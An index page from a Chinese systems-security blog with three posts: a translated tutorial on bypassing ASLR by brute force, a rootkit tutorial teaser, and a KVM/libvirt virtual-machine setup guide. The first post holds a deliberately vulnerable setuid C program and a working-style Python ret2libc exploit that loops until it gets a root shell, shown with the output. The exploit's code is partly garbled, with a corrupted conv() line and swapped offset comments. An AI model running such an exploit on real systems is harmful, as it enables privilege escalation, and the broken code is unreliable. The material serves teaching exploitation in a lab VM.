<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Index of Computer System and Security</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
    <meta name="keywords" content="computer system, computer security" />
  
  
  
  
  <meta name="description" content="FROM 0 TO 1">
<meta property="og:type" content="website">
<meta property="og:title" content="Index of Computer System and Security">
<meta property="og:url" content="http://yoursite.com/page/3/index.html">
<meta property="og:site_name" content="Index of Computer System and Security">
<meta property="og:description" content="FROM 0 TO 1">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Index of Computer System and Security">
<meta name="twitter:description" content="FROM 0 TO 1">
  
    <link rel="alternate" href="/atom.xml" title="Index of Computer System and Security" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >
  <link rel="stylesheet" href="/css/hiero.css" >
  <link rel="stylesheet" href="/css/glyphs.css" >

</head>

<body>
  <header id="allheader" class="site-header" role="banner">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            <a href="/" title="Index of Computer System and Security" rel="home">
              Index of Computer System and Security</a>
          </h1>
          <div class="site-description">FROM 0 TO 1</div>

            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>
            <div class="clearfix sf-menu">

              <ul id="main-nav" class="nmenu sf-js-enabled">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">首页</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/syssec">系统安全</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/architecture">体系结构</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/virtualization">虚拟化</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/malware">恶意代码</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/conferences">主流会议</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/academy">学术专家</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/celebrity">工业大咖</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/contribution">本站达人</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/donation">打赏支持</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">关于</a> </li>
                    
              </ul>
            </div>
          </nav>


      </div>
  </div>
</header>




  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main">
  
    <article id="post-bypassaslr-bruteforce"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170102/bypassaslr-bruteforce/">绕过ASLR-第二篇章(暴力破解)</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170102/bypassaslr-bruteforce/" class="article-date">
	  <time datetime="2017-01-02T10:57:33.000Z" itemprop="datePublished">一月 2, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/bypassaslr-bruteforce" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第二篇章(暴力破解)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<blockquote>
<ul>
<li>0X01 什么是暴力破解</li>
<li>0X02 </li>
<li>0X03</li>
</ul>
</blockquote>
<p><u>阅读基础</u>:<br>    <a href="http://www.csyssec.org/20161230/stackbufferflow/" target="_blank" rel="external">经典栈缓冲区溢出</a><br><u>VM Setup</u>: Ubuntu 12.04(x86)</p>
<p>在这篇文章中，我们来看看如果利用暴力破解技术来绕过共享库的地址随机化。</p>
<h3 id="什么是暴力破解"><a href="#什么是暴力破解" class="headerlink" title="什么是暴力破解"></a>什么是暴力破解</h3><p>通过此技术，攻击者选择一个特定的libc基地址，然后不断尝试攻击程序，直到成功。如果你幸运的话，这是绕过ASLR最简单的技术。</p>
<p><u>漏洞代码</u>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><u>编译命令</u>：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -fno-<span class="built_in">stack</span>-protector -g -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
<p>现在让我们来看看攻击者是如何暴力破解libc基地址的。下面是当开启随机化时，libc不同的基地址：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb75b6000</span>)</div><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb7568000</span>)</div><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb7595000</span>)</div><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb75d9000</span>)</div><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb7542000</span>)</div><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb756a000</span>)</div><div class="line">$</div></pre></td></tr></table></figure>
<p>从上面可知，libc的随机化只局限在8个比特位中。因此，最多只要尝试256次，就可以获取root shell。下面的漏洞利用代码中，选择0xb7595000作为libc的基地址，然后我们再不断尝试</p>
<p><u>漏洞利用代码</u>：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#exp.py</span></div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">libc_base_addr = <span class="number">0xb7595000</span></div><div class="line">exit_off = <span class="number">0x00032be0</span>             #Obtained from <span class="string">"readelf -s libc.so.6 | grep system"</span> command.</div><div class="line">system_off = <span class="number">0x0003f060</span>           #Obtained from <span class="string">"readelf -s libc.so.6 | grep exit"</span> command.</div><div class="line">system_addr = libc_base_addr + system_off</div><div class="line">exit_addr = libc_base_addr + exit_off</div><div class="line">system_arg = <span class="number">0x804827d</span></div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,numystem + <span class="built_in">exit</span> + system_arg</div><div class="line">buf = <span class="string">"A"</span> * <span class="number">268</span></div><div class="line">buf += conv(system_addr)</div><div class="line">buf += conv(exit_addr)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">#Multiple tries until we get lucky</div><div class="line">i = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> (i &lt; <span class="number">256</span>):</div><div class="line"> print <span class="string">"Number of tries: %d"</span> %i</div><div class="line"> i += <span class="number">1</span></div><div class="line"> ret = call([<span class="string">"./vuln"</span>, buf])</div><div class="line"> <span class="keyword">if</span> (not ret):</div><div class="line">  <span class="keyword">break</span></div><div class="line"> <span class="keyword">else</span>:</div><div class="line">  print <span class="string">"Exploit failed"</span></div></pre></td></tr></table></figure></p>
<p>执行上面的漏洞利用代码就可以获取root shell，如下所示</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">Number of tries: <span class="number">0</span></div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`@]��&#123;\�&#125;�</div><div class="line">Exploit failed</div><div class="line">...</div><div class="line">Number of tries: <span class="number">42</span></div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`@]��&#123;\�&#125;�</div><div class="line">Exploit failed</div><div class="line">Number of tries: <span class="number">43</span></div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`@]��&#123;\�&#125;�</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
<p><u>注意</u>： 类似地，栈地址和堆地址也可以暴力破解！</p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/bypassaslr-bruteforce" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第二篇章(暴力破解)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ASLR/">ASLR</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-rootkittutorial"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170102/rootkittutorial/">Rootkit综合教程</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170102/rootkittutorial/" class="article-date">
	  <time datetime="2017-01-02T09:18:13.000Z" itemprop="datePublished">一月 2, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        

          
            <div class="entry-summary" style="margin-left:0;">
            作者：Diting0x

CSysSec注： 本文来自Diting0x的个人博客，分析了Linux下不同类型的rootkit、相关原理以及源码分析，值得推荐。转载本文请务必注明，文章出处：《Rootkit综合教程》与作者信息：Diting0x




0x01: Definition of rootkit 
0x02: Classification of Rootkit
0x03: Hooking(Kernel Object Hooking) Rootkit
0X04: DKOM Rootkit
0x05: Rootkit Objectives
0x06: Example-Module Hiding
0x07: Example-Process Hiding
0x08: Rootkit ...
          

        
          <p class="article-more-link">
            <a href="/20170102/rootkittutorial/#more">阅读全文</a>
          </p>
        </div>
      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/恶意代码/">恶意代码</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Malware/">Malware</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Rootkit/">Rootkit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-virtualizationcomprehensive"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170102/virtualizationcomprehensive/">虚拟机环境搭建、管理、监控与分析</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170102/virtualizationcomprehensive/" class="article-date">
	  <time datetime="2017-01-02T08:23:01.000Z" itemprop="datePublished">一月 2, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/03/31/virt-setup-analysis/" target="_blank" rel="external">个人博客</a>，从虚拟机的环境搭建、管理、监控到分析，介绍的内容非常全面，值得推荐。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/virtualizationcomprehensive/" target="_blank" rel="external">虚拟机环境搭建、管理、监控与分析</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
<hr>
<blockquote>
<ul>
<li>0x01 全文环境 </li>
<li>0x02 虚拟机创建KVM/QEMU </li>
<li>0x03 虚拟机管理Libvirt</li>
<li>0x04 虚拟机监控Libvmi</li>
<li>0x05 虚拟机监控Volatility</li>
</ul>
</blockquote>
<p>本文介绍了一套完整的虚拟化环境搭建与分析工作，包括虚拟机的创建，虚拟机的管理，以及虚拟机的监控与分析。可根据自身需要阅读相关内容。</p>
<hr>
<h3 id="0x01-全文环境"><a href="#0x01-全文环境" class="headerlink" title="0x01 全文环境"></a>0x01 全文环境</h3><p>Ubuntu12.04 + Kvm-kmod-3.8 + Qemu-kvm-1.1.2+ Libvirt 1.3.2 + Libvmi + Volatility </p>
<h3 id="Ox02-虚拟机创建KVM-QEMU"><a href="#Ox02-虚拟机创建KVM-QEMU" class="headerlink" title="Ox02 虚拟机创建KVM/QEMU"></a>Ox02 虚拟机创建KVM/QEMU</h3><p>Kvm需要CPU的支持（Intel VT 或者 AMD SVM)，在安装KVM之前，可先检查CPU是否支持硬件虚拟化技术。基于Intel的系统，可运行 ‘grep vmx /proc/cpuinfo’ 查看是否含有vmx的关键字，如果有，则表示支持；基于AMD的系统，可运行 ‘grep svm /proc/cpuinfo’ 查看是否含有svm的关键字。<br>另外，CPU若支持硬件虚拟化，还得确保BLOS开启了VT选项（有些厂商默认是禁用的，如thinkpad t450). 可以下载 cpu-checker 工具（apt-get install cpu-checker)，之后运行kvm-ok， 如果提示 kvm acceleration can not be used，则可能是blos禁用了kvm虚拟化，在blos设置中开启即可。</p>
<p>可执行：</p>
<pre><code>modprobe kvm 
modprobe kvm_intel 
</code></pre><p>开启内核自带的kvm</p>
<p>关于源码安装kvm-kmod以及qemu-kvm的详细过程可参考 <a href="http://www.csyssec.org/20170102/kvmqemuintro/" target="_blank" rel="external">上一篇</a> 文章。kvm-kmod安装成功后，运行lsmod | grep kvm， 会显示两个module:</p>
<pre><code>kvm_intel             137721  3 
kvm                   415549  1 kvm_intel
</code></pre><p>qemu-kvm安装成功后会在/your-confiure-location/bin/qemu-system-x86_64等可执行文件。</p>
<p>安装完KVM/QEMU后，创建虚拟机的时候，虚拟机的网络方式是比较关心的问题，KVM/QEMU有两种网络配置方式。</p>
<p>其一，用户模式（User Networking): 即NAT方式，也是默认的网络模式。让虚拟机访问主机、互联网或本地网络上的资源的简单方法，但是不能从网络或其他的客户机访问客户机。既然无法访问客户机，那宿主机与客户机该如何传输文件呢？默认的，客户机得到的ip空间为10.0.2.0/24，宿主机提供了ip为10.0.2.2的地址让虚拟机访问。可以ssh到宿主机(10.0.2.2)，用scp来拷贝文件。</p>
<p>其二，桥接模式（Bridge Networking): 这种模式允许客户机就像一台独立的主机一样拥有网络。这种方式要比用户网络复杂一些，但是设置好后客户机与互联网，客户机与主机之间的通信都很容易。桥接网络需要网卡支持，一般的有线网卡都支持，绝大部分的无线网卡都不支持。</p>
<p>NAT方式是KVM/QEMU提供的默认方式，要设置桥接模式，首先在宿主机上安装桥接相关的包，</p>
<pre><code>apt-get install bridge-utils. 
</code></pre><p>修改/etc/network/interfaces</p>
<pre><code>auto lo
iface lo inet loopback
auto eth0
iface eth0 inet manual
auto br0
iface br0 inet dhcp
   bridge_ports eth0
   bridge_stp off
   bridge_fd 9
   bridge_hello 2
   bridge_maxwait 0
</code></pre><p>执行</p>
<pre><code>/etc/init.d/networking restart
</code></pre><p>配置好后，可运行brctl-show命令，会显示：</p>
<pre><code>bridge name      bridge id              STP enabled interfaces
br0              8000.68f728eddb0d      no          eth0
                                              vnet0
</code></pre><p>之后在创建虚拟机的时候可添加-net nic -net tap参数，如</p>
<pre><code>/usr/local/bin/qemu-system-x86_64 -hda imgname.img -vnc :1 -m 1024 -net nic -net tap -monitor stdio    
</code></pre><p>之后创建的虚拟机便工作在网桥模式中。</p>
<h3 id="0x03-虚拟机管理Libvirt"><a href="#0x03-虚拟机管理Libvirt" class="headerlink" title="0x03 虚拟机管理Libvirt"></a>0x03 虚拟机管理Libvirt</h3><p>除了用qemu命令行的方式创建与管理虚拟机，也可将一些命令行参数保存为xml配置文件，用libvirt来管理。libvirt是一套管理虚拟机的工具，包括管理虚拟机的API、一个守护进程（libvirtd)和一个命令行工具（virsh). Libvirt 的主要目标是提供一个单一途径以管理多种不同虚拟化方案已经虚拟化主机，包括KVM/QEMU,Xen,LXC等。安装libvirt后，会产生libvirtd进程以及virsh工具，要利用libvirt做开发，可调用其中的API。libvirt, libvirtd 以及virsh的关系如下图：</p>
<p><img src="http://7xppf1.com1.z0.glb.clouddn.com/libvirt-internal.png" alt="libvirt-internal"></p>
<p>详细介绍可参考：<a href="http://libvirt.org/internals.html" target="_blank" rel="external">libvirt internals</a></p>
<p>安装libvirt: </p>
<p>先安装libvirt所依赖的包</p>
<pre><code>apt-get install libnl-dev libxml2 libxml2-dev  libpciaccess-dev libyajl-dev libdevmapper-dev libgnutls-dev
</code></pre><p>如出现以下错误，都可以检查上述这些包是否安装好</p>
<pre><code>error: Could not find libxml2 anywhere

error: You must install the GnuTLS library in order to compile and run libvirt

error: You must install device-mapper-devel/libdevmapper &gt;= 1.0.0 to compile libvirt

error: libnl-devel &gt;= 1.1 is required for macvtap support
</code></pre><p>下载libvirt1.3.2.tar.gz</p>
<pre><code>tar xvf libvirt1.3.2.tar.gz
./configure
make &amp;&amp; make install
</code></pre><p>安装完成后，执行ldconfig同步链接库，否则会出现以下错误：</p>
<pre><code>virsh: error while loading shared libraries: libvirt.so.0: cannot open shared object file: No such file or directory
</code></pre><p>执行检查libvirt安装成功</p>
<pre><code>which libvirtd
libvirtd –version
which virsh
virsh –version
</code></pre><p>若出现此类错误：</p>
<pre><code>error: Failed to reconnect to the hypervisor
error: no valid connection
error: Failed to connect socket to &apos;/usr/local/var/run/libvirt/libvirt-sock&apos;: No such file or directory
</code></pre><p>则很有可能是libvirtd进程没有开启，这时需要手动开启libvirtd,执行libvirtd -d 即可。(libvirtd具体参数可参考：<a href="http://linux.die.net/man/8/libvirtd" target="_blank" rel="external">libvirtd manual</a> ）</p>
<p>另外注意，libvirt从1.3版本后增加了virtlogd特性，需要执行virtlogd -d手动开启virtlogd进程（virtlogd具体参数可参看：<a href="https://www.mankier.com/8/virtlogd" target="_blank" rel="external">virtlogd manual</a> ）. 否则会出现以下错误：</p>
<pre><code>error: Failed to connect socket to &apos;/usr/local/var/run/libvirt/virtlogd-sock&apos;: No such file or directory
</code></pre><p>安装好libvirt后，便可配置好xml文件，用virsh来管理。具体virsh命令这里不做介绍，可参考其中一个配置文件：</p>
<pre><code>&lt;domain type=&apos;kvm&apos;&gt;
&lt;name&gt;ubuntudemo&lt;/name&gt;&lt;!--虚拟机名称--&gt;
&lt;memory&gt;1048576&lt;/memory&gt;&lt;!--最大内存，单位KB--&gt;
&lt;currentMemory&gt;1048576&lt;/currentMemory&gt;&lt;!--可用内存，单位k--&gt;
&lt;uuid&gt;87d5b3d2-3618-4a59-9efb-aa869ff34999&lt;/uuid&gt;

&lt;vcpu&gt;1&lt;/vcpu&gt;&lt;!--虚拟cpu个数--&gt;
&lt;os&gt;
    &lt;type arch=&apos;x86_64&apos;,machine=&apos;pc&apos;&gt;hvm&lt;/type&gt;
    &lt;boot dev=&apos;hd&apos;/&gt;&lt;!--光盘启动--&gt;
&lt;/os&gt;
&lt;features&gt;
    &lt;acpi/&gt;
    &lt;apic/&gt;
    &lt;pae/&gt;
&lt;/features&gt;
&lt;clock offset=&apos;localtime&apos;/&gt;
&lt;on_poweroff&gt;destroy&lt;/on_poweroff&gt;
&lt;on_reboot&gt;restart&lt;/on_reboot&gt;
&lt;on_crash&gt;destroy&lt;/on_crash&gt;
&lt;devices&gt;
    &lt;emulator&gt;/usr/bin/qemu&lt;/emulator&gt; &lt;!--先创建好软链接   ln -s /use/local/qemukvm1.1.2/bin/qemu-system-x86_64 /usr/bin/qemu--&gt;
    &lt;disk type=&apos;file&apos; device=&apos;disk&apos;&gt;
        &lt;driver name=&apos;qemu&apos; type=&apos;qcow2&apos;/&gt;
        &lt;source file=&apos;/home/os.img/server12041.img&apos;/&gt;&lt;!--目的镜像路径--&gt;
        &lt;target dev=&apos;vda&apos; bus=&apos;virtio&apos;/&gt;
    &lt;/disk&gt;

    &lt;interface type=&apos;bridge&apos;&gt;&lt;!--虚拟机网络连接方式--&gt;
        &lt;source bridge=&apos;br0&apos;/&gt;&lt;!--当前主机网桥的名称--&gt;
        &lt;mac address=&quot;00:16:3e:5d:aa:a8&quot;/&gt;&lt;!--为虚拟机分配mac地址，务必唯一，否则dhcp获得同样ip,引起冲突--&gt;
    &lt;/interface&gt;
    &lt;input type=&apos;mouse&apos; bus=&apos;ps2&apos;/&gt;
    &lt;!--vnc方式登录，端口号自动分配，自动加1，可以通过virsh vncdisplay ubuntudemo来查询（实际端口为显示结果+5900）--&gt; 
    &lt;graphics type=&apos;vnc&apos; port=&apos;-1&apos; autoport=&apos;yes&apos; listen=&apos;0.0.0.0&apos; keymap=&apos;en-us&apos;/&gt;
&lt;/devices&gt;
</code></pre><p></p>
